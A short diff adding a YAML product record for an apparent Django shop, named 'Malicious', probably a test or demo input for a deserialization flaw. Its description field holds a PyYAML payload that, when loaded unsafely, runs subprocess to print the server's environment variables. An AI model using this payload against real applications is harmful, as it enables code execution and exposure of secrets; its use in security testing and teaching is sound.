@@ -1,0 +1,7 @@
+name: Malicious
+category: 1
+description: !!python/object/apply:subprocess.check_output ["printenv"]
+price: 120
+available: 1
+stock: 10
+image: "djangocon.png"
